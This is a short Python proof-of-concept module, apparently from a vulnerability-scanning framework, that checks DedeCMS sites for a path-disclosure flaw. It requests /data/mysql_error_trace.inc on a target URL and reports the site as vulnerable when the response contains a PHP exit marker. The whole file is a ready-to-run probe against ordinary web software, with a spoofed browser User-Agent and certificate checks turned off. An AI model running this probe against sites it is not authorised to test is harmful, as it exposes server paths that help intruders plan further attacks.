#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: dedecms trace爆路径漏洞
referer: http://0daysec.blog.51cto.com/9327043/1571372
author: Lucifer
description: 访问mysql_error_trace.inc,mysql trace报错路径泄露。
'''
import sys
import requests
import warnings
from termcolor import cprint

class Exploit:
    def attack(self, url):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/data/mysql_error_trace.inc"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"<?php  exit()" in req.text:
                cprint("[+]存在dedecms trace爆路径漏洞...(信息)\tpayload: "+vulnurl, "green")
                return '存在dedecms trace爆路径漏洞'

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")
